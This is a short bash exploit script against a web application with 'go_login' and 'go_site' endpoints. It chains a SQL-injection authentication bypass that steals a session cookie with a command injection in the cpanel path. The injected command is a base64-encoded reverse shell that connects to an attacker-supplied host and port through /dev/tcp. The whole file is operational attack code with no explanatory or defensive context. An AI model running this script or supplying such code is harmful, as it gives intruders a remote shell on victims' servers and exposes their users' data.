#!/bin/bash

if [ $# -ne 6 ]; then
        echo "Usage: exploit.sh -u <url> -r <lhost> -p <lport>"
		exit 1
fi

while getopts u:r:p: flag
do
    case "${flag}" in
        u) URL=${OPTARG};;
        r) IP=${OPTARG};;
        p) Port=${OPTARG};;
    esac
done

shell="bash -i >& /dev/tcp/$IP/$Port 0>&1"
shell_base=$(echo $shell | base64)
echo "Payload: $shell"
curl -k "$URL/go_login/validate_credentials/admin/'%20OR%20'1'='1" --head | grep "go_session" | cut -f 2 -d " " 2>/dev/null > /tmp/sess

isInFile=$(cat /tmp/sess | grep -c "go_session")


if [ $isInFile -eq 0 ]; then
   #string not contained in file
   echo "[+] Authentication Failed !"
   exit 0;
else
   #string is in file at least once
   echo "[+] Authentication Successful !"
   for i in $(cat /tmp/sess)
   do 
      curl --cookie $i -k "$URL/index.php/go_site/go_get_user_info/'%20or%20active='Y -s"; 
      curl --cookie $i -k "$URL/index.php/go_site/cpanel/%7cecho%20-n%20$shell_base%20%7cbase64%20--decode%7cbash";
      rm -rf "/tmp/sess"
   done
   echo "[+] Exploit Complete"
fi

